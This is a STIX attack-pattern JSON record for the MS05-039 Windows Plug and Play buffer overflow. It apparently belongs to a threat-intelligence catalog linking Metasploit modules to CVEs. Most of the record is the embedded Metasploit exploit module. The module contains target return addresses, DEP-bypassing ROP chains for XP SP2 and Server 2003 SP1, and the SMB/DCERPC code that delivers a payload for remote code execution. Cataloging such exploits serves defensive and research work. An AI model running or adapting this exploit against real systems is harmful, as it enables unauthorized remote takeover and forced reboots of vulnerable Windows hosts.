{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--73efcc25-aa85-4f06-8c04-687fbf967895",
    "created": "2024-08-14T16:56:32.391683Z",
    "modified": "2024-08-14T16:56:32.391687Z",
    "name": "MS05-039 Microsoft Plug and Play Service Overflow",
    "description": " This module exploits a stack buffer overflow in the Windows Plug and Play service. This vulnerability can be exploited on Windows 2000 without a valid user account.  NOTE: Since the PnP service runs inside the service.exe process, a failed exploit attempt will cause the system to automatically reboot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms05_039_pnp.rb",
            "external_id": "ms05_039_pnp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1983"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS05-039 Microsoft Plug and Play Service Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Windows Plug\n        and Play service. This vulnerability can be exploited on\n        Windows 2000 without a valid user account.\n\n        NOTE: Since the PnP service runs inside the service.exe process, a failed\n        exploit attempt will cause the system to automatically reboot.\n      },\n      'Author'         => [ 'hdm', 'cazz' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-1983' ],\n          [ 'OSVDB', '18605' ],\n          [ 'BID', '14513' ],\n          [ 'MSB', 'MS05-039' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 SP0-SP4', # Tested OK - 11/25/2005 hdm\n            {\n              'Ret'      => 0x767a38f6, # umpnpmgr.dll\n            },\n          ],\n          [\n            'Windows 2000 SP4 French',\n            {\n              'Ret'      => 0x767438f6, # French target by ExaProbe <fmourron@exaprobe.com>\n            },\n          ],\n          [\n            'Windows 2000 SP4 Spanish',\n            {\n              'Ret'      => 0x767738f6, # umpnpmgr.dll\n            },\n          ],\n          [\n            # Tested on: English/French/German/Dutch/Finnish/Greek/Polish/Portuguese/Hungarian/Korean/Chinese/Arabic/Turkish/Russian\n            'Windows 2000 SP4 Universal',\n            {\n              'Ret'      => 0x01013C79, # [Pita] [Houmous] <pita@mail.com>\n            },\n          ],\n          [\n            'Windows 2000 SP0-SP4 German',\n            {\n              'Ret'      => 0x767338f6, # German target by Michael Thumann <mthumann@ernw.de>\n            },\n          ],\n          [\n            'Windows 2000 SP0-SP4 Italian',\n            {\n              'Ret'      => 0x7677366f, # acaro <acaro@jervus.it>\n            },\n          ],\n          [\n            'Windows XP SP1 English',\n            {\n              'Ret'      => 0x758c572a, # pop edi / pop ebx / ret in umpnpmgr.dll v5.1.2600.1106\n              'Pipe'     => 'ntsvcs',\n              'Offset'   => 16,\n            }\n          ],\n          # NOTE: XP SP2, Server 2003 (and SP1) require an Administrator account to access\n          # the vulnerable functionality.\n          [\n            'Windows XP SP2 English (Requires Admin)',\n            # SafeSEH enabled, DEP AlwaysOn\n            {\n              #'Ret'       => 0x41424344,\n              'Ret'       => 0x758d2bb3,  # pop eax / ret 0x8\n              'Pipe'      => 'ntsvcs',\n              'PtrToZero' => 0x758c0170,  # PE data of umpnpmgr.dll v5.1.2600.2180\n              'Offset'    => 72,\n              'EspOffset' => 108,\n              'RopStack'  =>\n                # All addresses are from umpnpmgr.dll v5.2.3790.1830\n                [\n                  #\n                  # Step 1. Allocate an executable heap with HeapCreate\n                  #\n                  # Resolve HeapCreate from import\n                  0x758c1148,            # pointer to HeapCreate import\n                  0x758c2950,            # mov eax, [eax] / pop ebp / ret 0x8\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  #0x758da008,            # becomes ebp (something writable)\n                  0x758da1c8-0xc,        # becomes ebp (writable, used later)\n\n                  # Call HeapCreate\n                  0x758cb728,            # call eax / mov [ebp+0xc],eax / jmp... / mov eax,[ebp+0xc] / pop edi,esi,ebx,ebp / ret 0xc\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x01040110,            # flOptions (gets & with 0x40005)\n                  0x01010101,\n                  0x01010101,\n                  0x758ce552,            # becomes edi - pop edi,esi / ret\n                  0x758cdd7e,            # becomes esi - pop esi,ebx,ebp / ret 0x4\n                  0x41414141,            # becomes ebx\n                  0x41414141,            # becomes ebp\n\n                  # Don't bother calling HeapAlloc, just add 0x8000 to the Heap Base\n                  0x758d45f3,            # or eax,0x8000 / pop ebp / ret 0x4\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x41414141,            # becomes ebp\n\n                  # save eax to ebx\n                  0x758ce0d5,            # push eax / call esi\n                  0x41414141,            # scratch\n                  0x758da008+0x18,       # becomes ebp\n\n                  # Setup eax to load our saved stack pointer\n                  0x758d18db,            # pop eax / ret 0xc\n                  0x41414141,            # scratch\n                  0x758c524e,            # becomes eax - pop ebp / ret 0x8\n                  #0x758c2423,            # becomes eax - pop esi,ebp / ret 0x8\n\n                  # Store a pointer to the stack to a known address (ebp-0x18), flows to eax after\n                  0x758c1281,            # mov [ebp-0x18],esp / push eax / mov eax,[ebp-4] / mov [ebp-4],0xffffffff / mov [ebp-8],eax / lea eax,[ebp-0x10] / mov fs:[0],eax / ret\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  #0xcafebabe,            # becomes esi\n                  0x758da008-0x10,       # becomes ebp\n\n                  # Call lstrcpyW to copy shellcode into executable heap\n                  0x758c542e,            # push [ebp+0x10] / push ebx / call lstrcpyW / push ebx / call edi\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n\n                  # Skip the junk\n                  0x758c96f6,            # add al,0x3b / ret\n\n                  # Call the executable segment!\n                  0x758c3b62             # call eax\n                ]\n            }\n          ],\n          [\n            'Windows Server 2003 SP0 English (Requires Admin)',\n            # SafeSEH unsupported, DEP unsupported\n            {\n              'Ret'       => 0x780df756, # push esp / ret in msvcp60.dll\n              'Pipe'      => 'ntsvcs',\n              'PtrToZero' => 0x757702c0, # PE data of umpnpmgr.dll\n              'Offset'    => 72,\n            }\n          ],\n          [\n            'Windows Server 2003 SP1 English (Requires Admin)',\n            # SafeSEH enabled, DEP AlwaysOn\n            {\n              'Pipe'      => 'ntsvcs',\n              # We will need to bypass DEP!\n              #'Ret'       => 0x41424344,\n              'Ret'       => 0x757873d5,  # pop eax / ret 0x4\n              'PtrToZero' => 0x757702c0,  # PE data of umpnpmgr.dll\n              'Offset'    => 72,          # offset to saved eip\n              'EspOffset' => 108,         # Offset to where esp ends up pointing\n              'RopStack'  =>              # NOTE: 0x41414141 will become random data\n                # All addresses are from umpnpmgr.dll v5.2.3790.1830\n                [\n                  #\n                  # Step 1. Allocate an executable heap with HeapCreate\n                  #\n                  # Resolve HeapCreate from import\n                  0x75771144,            # pointer to HeapCreate import\n                  0x75772e68,            # mov eax, [eax] / pop ebp / ret\n                  0x41414141,            # scratch\n                  0x41414141,            # becomes ebp\n                  # Call HeapCreate\n                  0x7578bc37,            # jmp eax\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  # Save the new heap address in edi\n                  0x757791d5,            # xchg eax,edi / cmp bh,0xff / ret 0x10\n                  0x01040110,            # flOptions (gets & with 0x40005)\n                  0x01010101,\n                  0x01010101,\n\n                  #\n                  # Step 2. Allocate a buffer using this new heap.\n                  #\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  # Resolve HeapAlloc from import\n                  0x7577115c,            # pointer to HeapAlloc import\n                  0x75772e68,            # mov eax, [eax] / pop ebp / ret\n                  0x41414141,            # scratch\n                  0x41414141,            # becomes ebp\n                  # Save the address of HeapAlloc in esi\n                  0x75777ae0,            # xchg eax,esi / mov dl,0xff / dec ecx / ret\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  # Call HeapAlloc\n                  0x7578bb6b,            # push edi / call esi / pop edi,esi,ebp / ret\n                  0xffffffff,            # flags\n                  0x00010001,            # allocation size\n                  0x0101018d,            # becomes edi / first byte stored\n                  0x7577835c,            # becomes esi - pop esi / pop ebx / ret\n                  0x757830c3,            # becomes ebp/eip - pop esi / ret\n\n                  #\n                  # Step 3. Save the heap address into ebx\n                  #\n                  0x7578308f,            # push eax / mov [0x7578d8e0],edi / mov [0x7578d39c],edi / call esi\n                  0x41414141,            # scratch\n                  # Put heap address in edi\n                  0x757791d5,            # xchg eax,edi / cmp bh,0xff / ret 0x10\n\n                  #\n                  # Step 4. Write stub:\n                  #\n                  # metasm > lea esi,[esp+4]; _start: lodsb; test al,al; jz _out; stosb; _end: jmp _start; _out:\n                  # \"\\x8d\\x74\\x24\\x04\\xac\\x84\\xc0\\x74\\x03\\xaa\\xeb\\xf8\"\n                  #\n                  # Store the first byte.\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x01010174,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x01010124,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x01010104,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x010101ac,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x01010184,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x010101c0,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x01010174,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x01010103,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x010101aa,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x010101eb,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n                  # Store another byte!\n                  0x757873d5,            # pop eax / ret 0x4\n                  0x010101f8,            # next byte to write\n                  0x7578be14,            # stosb / ret\n                  0x41414141,            # scratch\n\n                  #\n                  # Step 5. Finally, call our executable heap buffer.\n                  #\n                  0x75783efe             # call ebx\n                ]\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2005-08-09'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)\", 'browser']),\n      ])\n\n  end\n\n  def pnp_probe(req, pipe = datastore['SMBPIPE'])\n\n    print_status(\"Connecting to the SMB service...\")\n    begin\n      connect()\n      smb_login()\n    rescue ::Exception => e\n      print_error(\"Error: #{e.class} #{e}\")\n    end\n\n    handle = dcerpc_handle('8d9f4e40-a03d-11ce-8f69-08003e30051b', '1.0', 'ncacn_np', [\"\\\\#{pipe}\"])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    # CS_DES\n    cs_des =\n      NDR.long(0) + # CSD_SignatureLength\n      NDR.long(0) + # CSD_LegacyDataOffset\n      NDR.long(req.length) + # CSD_LegacyDataSize\n      NDR.long(0) + # CSD_Flags\n      rand_text(16) + # GUID\n      req # CSD_LegacyData\n\n    # PNP_QueryResConfList(L\"a\\\\b\\\\c\", 0xffff, (char *)pClassResource, 1000, foo, 4, 0);\n\n    # ResourceName:\n    stubdata =\n      NDR.UnicodeConformantVaryingString(\"a\\\\b\\\\c\") +  # ResourceName, passes both IsLegalDeviceId and IsRootDeviceID\n      NDR.long(0xffff) +                               # ResourceID: ResType_ClassSpecific\n      NDR.UniConformantArray(cs_des) +                 # Resource (our CS_DES structure)\n      NDR.long(cs_des.length) +                        # ResourceLen\n      NDR.long(4) +                                    # OutputLen (at least 4)\n      NDR.long(0)                                      # Flags\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      dcerpc.call(0x36, stubdata)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      print_status('Server did not respond, this is expected')\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_status('Server disconnected, this is expected')\n      else\n        raise e\n      end\n    end\n\n    # Cleanup\n    disconnect\n\n    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil and\n        dcerpc.last_response.stub_data == \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\")\n      return true\n    else\n      return false\n    end\n  end\n\n  def check\n    if (pnp_probe('A'))\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # If PtrToZero is set, we use saved-ret-overwrite instead of SEH.\n    if target['PtrToZero'] then\n      eip_off = target['Offset']\n      nul_off = eip_off + 8\n\n      # DEP Bypass version (2003 SP1)\n      if target['RopStack']\n        esp_off = target['EspOffset']\n\n        # Start with a randomized base buffer\n        rop_length = target['RopStack'].length * 4\n        print_status(\"ROP Data is %u bytes\" % rop_length)\n        buf = rand_text(esp_off + rop_length)\n\n        # Put the rest of the stack data at where esp ends up...\n        target['RopStack'].each_with_index { |el,idx|\n          if el != 0x41414141\n            buf[esp_off + (idx*4), 4] = [el].pack('V')\n          end\n        }\n      else\n        # Start with a randomized base buffer\n        buf = rand_text(nul_off)\n      end\n\n      # This becomes EIP\n      buf[eip_off,4] = [target.ret].pack('V')\n\n      # Pointer to NULL (4 zero bytes)\n      buf[nul_off,4] = [target['PtrToZero']].pack('V')\n    else\n      # Pad the string up to reach our SEH frame\n      buf = rand_text(target['Offset'] ? target['Offset'] : 56)\n\n      # Jump over the address and our invalid pointer to the payload\n      buf << Rex::Arch::X86.jmp_short('$+32')\n      buf << rand_text(2)\n\n      # The SEH handler pointer\n      buf << [target.ret].pack('V')\n\n      # Some padding to reach the next pointer\n      buf << rand_text(20)\n\n      # ResourceName - cause access violation on RtlInitUnicodeString\n      buf << rand_text(3) + \"\\xff\"\n    end\n\n    # Append the encoded payload and we are good to go!\n    buf << payload.encoded\n\n    # Determine which pipe to use\n    pipe = target['Pipe'] ? target['Pipe'] :  datastore['SMBPIPE']\n\n    pnp_probe(buf, pipe)\n\n    print_status('The server should have executed our payload')\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-08-09",
    "x_mitre_platforms": [
        "win'"
    ]
}